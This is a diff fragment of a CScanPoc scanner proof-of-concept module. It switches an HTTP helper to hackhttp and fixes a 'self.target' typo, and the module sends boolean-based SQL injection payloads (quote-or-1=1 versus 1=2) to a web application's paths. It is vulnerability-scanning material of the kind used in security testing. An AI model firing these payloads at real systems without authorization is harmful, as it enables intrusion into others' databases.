@@ -2,7 +2,9 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
+
 import re
+hh = hackhttp.hackhttp()
 
 
 class Vuln(ABVuln):
@@ -40,7 +42,7 @@ def matchurl(arg):
     urllist = []
     for data in m1:
         url = arg + '/root/' + data + '/gyxt.jsp'
-        code, head, res, errcode, _ = curl.curl2(url)
+        code, head, res, errcode, _ = hh.http(url)
         if code == 200:
             urllist.append(url)
     return urllist
@@ -86,7 +88,7 @@ class Poc(ABPoc):
                     payload1 = payload + '%27%20or%20%271%27=%271'
                     payload2 = payload + '%27%20or%20%271%27=%272'
                     url1 = self.target + payload1
-                    url2 = self, target + payload2
+                    url2 = self.target + payload2
                     code1, head, res1, errcode, _ = hh.http(url1)
                     code2, head, res2, errcode, _ = hh.http(url2)
                     m1 = re.findall('src', res1)
